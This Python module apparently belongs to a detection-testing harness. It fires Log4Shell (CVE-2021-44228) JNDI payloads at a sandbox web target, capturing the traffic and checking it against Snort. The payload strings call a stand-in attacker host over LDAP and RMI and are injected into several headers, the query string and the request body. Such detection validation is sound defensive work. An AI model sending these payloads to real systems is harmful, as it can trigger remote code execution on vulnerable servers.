"""
T7 — Log4Shell N-day Probe (T1190)

Sends HTTP requests carrying a CVE-2021-44228 (Log4Shell) JNDI payload to
the sandbox web target. The trigger string lands in URI, User-Agent,
Referer, X-Api-Version, and request body. Captures the resulting traffic
to pcap, then replays the pcap through an offline Snort 3 instance to
validate that signature-based NIDS would have caught it.

Non-destructive: nginx in the sandbox is not vulnerable; no Java, no
outbound LDAP/RMI callback. Goal is the detection chain end-to-end —
probe → pcap → Snort → snort_alert observable.
"""

import os
import socket
import time
import urllib.error
import urllib.request

import pcap_util
import snort_util


def _resolve(host_name: str) -> str:
    """Map sandbox container DNS name to an addressable host. See t3 docs."""
    if os.environ.get("TARGET_USE_LOCALHOST") == "1":
        return "localhost"
    env_key = f"TARGET_{host_name.upper().replace('-', '_')}_HOST"
    return os.environ.get(env_key, host_name)


def _send(url: str, headers: dict, body: bytes | None, timeout: float) -> str:
    method = "POST" if body is not None else "GET"
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return f"{resp.status}"
    except urllib.error.HTTPError as e:
        # 4xx/5xx still means the payload reached the server — capture-wise
        # it's a success; we record the status for completeness.
        return f"{e.code}"
    except (urllib.error.URLError, socket.timeout, ConnectionError, OSError) as e:
        return f"error:{type(e).__name__}"


def _build_probes(callback_host: str) -> list:
    """Five probes — one per common JNDI placement seen in public PoCs."""
    ldap = f"${{jndi:ldap://{callback_host}/a}}"
    rmi  = f"${{jndi:rmi://{callback_host}/b}}"
    return [
        {
            "name": "user_agent_ldap",
            "method": "GET",
            "path": "/",
            "headers": {"User-Agent": ldap},
            "body": None,
        },
        {
            "name": "uri_query_ldap",
            "method": "GET",
            "path": f"/?token={ldap}",
            "headers": {"User-Agent": "redteam-log4shell/1.0"},
            "body": None,
        },
        {
            "name": "referer_rmi",
            "method": "GET",
            "path": "/",
            "headers": {
                "User-Agent": "redteam-log4shell/1.0",
                "Referer": rmi,
            },
            "body": None,
        },
        {
            "name": "x_api_version_ldap",
            "method": "GET",
            "path": "/",
            "headers": {
                "User-Agent": "redteam-log4shell/1.0",
                "X-Api-Version": ldap,
            },
            "body": None,
        },
        {
            "name": "post_body_ldap",
            "method": "POST",
            "path": "/",
            "headers": {
                "User-Agent": "redteam-log4shell/1.0",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "body": f"token={ldap}".encode(),
        },
    ]


def run(scenario_def: dict, run_id: str, mode: str) -> dict:
    params = scenario_def["parameters"]
    target = scenario_def["target"]

    host_name = target.get("host", "target-web")
    port = int(target.get("port", 80))
    source = params.get("source_label", "redteam-log4shell")
    timeout = float(params.get("connect_timeout_seconds", 5.0))
    delay = float(params.get("inter_probe_delay_seconds", 0.2))
    callback_host = params.get("jndi_callback_host", "attacker.example")

    # On localhost-bound sandboxes (run-local.sh, GitHub runner) target-web is
    # exposed on 8080 to host. The container-internal port stays 80.
    if os.environ.get("TARGET_USE_LOCALHOST") == "1":
        port = int(target.get("host_port", 8080))

    host = _resolve(host_name)
    base_url_root = f"http://{host}:{port}"

    probes = _build_probes(callback_host)
    probes = probes[: int(params.get("request_count", len(probes)))]

    observables: list = []
    pcap_artifact = None
    sent = 0
    errors = 0

    print(f"[T7] Source: {source}")
    print(f"[T7] Target: {base_url_root}")
    print(f"[T7] JNDI callback host: {callback_host}")
    print(f"[T7] Probes queued: {len(probes)}")

    scenario_id = scenario_def.get("id", "t7_log4shell_probe")

    # Capture on the loopback interface — Snort 3 on alpine cannot decode
    # LINUX_SLL2 (the default for `-i any`), but EN10MB (lo) replays cleanly.
    # In a docker-compose run the runner and target share the same host
    # netns via `network_mode: host` on the runner side, so lo sees both
    # ends regardless.
    with pcap_util.capture(
        scenario_id, run_id,
        ports=[port],
        iface=os.environ.get("PCAP_INTERFACE_T7", "lo"),
    ) as (pcap_path, pcap_active):
        if pcap_active:
            pcap_artifact = pcap_path

        for i, probe in enumerate(probes, 1):
            url = base_url_root + probe["path"]
            outcome = _send(url, probe["headers"], probe["body"], timeout)
            sent += 1
            if outcome.startswith("error:"):
                errors += 1
            print(f"[T7] {i}/{len(probes)}: {probe['name']:20s} → {outcome}")

            observables.append({
                "type": "http_request",
                "pattern": "log4shell_probe",
                "source": source,
                "destination_host": host_name,
                "destination_port": port,
                "method": probe["method"],
                "path": probe["path"],
                "probe_name": probe["name"],
                "outcome": outcome,
                "event_time": time.time(),
                "run_id": run_id,
            })

            if i < len(probes) and delay > 0:
                time.sleep(delay)

    print(f"\n[T7] Done. Sent: {sent}  Errors: {errors}")

    snort_alerts: list = []
    if pcap_artifact:
        try:
            snort_alerts = snort_util.replay(pcap_artifact, run_id, scenario_id)
            for a in snort_alerts[:10]:  # cap stdout chatter
                print(
                    f"[T7] [Snort] sid={a['rule_id']} "
                    f"src={a['source_ip']}:{a['source_port']} "
                    f"→ {a['destination_ip']}:{a['destination_port']} "
                    f'msg="{a["signature"]}"'
                )
            if len(snort_alerts) > 10:
                print(f"[T7] [Snort] ... and {len(snort_alerts) - 10} more")
            observables.extend(snort_alerts)
        except Exception as e:
            print(f"[T7] Snort replay failed: {e}")

    # We consider the scenario successful when (a) all probes were sent
    # without transport errors AND (b) Snort fired at least one alert if
    # the recorder was active. Failing-soft on Snort allows the rest of
    # the run to proceed.
    snort_required = bool(pcap_artifact)
    snort_ok = (not snort_required) or len(snort_alerts) > 0
    status = "success" if errors == 0 and snort_ok else "partial"

    details = {
        "source": source,
        "target_host": host_name,
        "target_port": port,
        "callback_host": callback_host,
        "probes_sent": sent,
        "errors": errors,
        "snort_alert_count": len(snort_alerts),
    }
    if pcap_artifact:
        details["pcap_artifact"] = pcap_artifact

    return {
        "status": status,
        "observables_generated": observables,
        "details": details,
    }
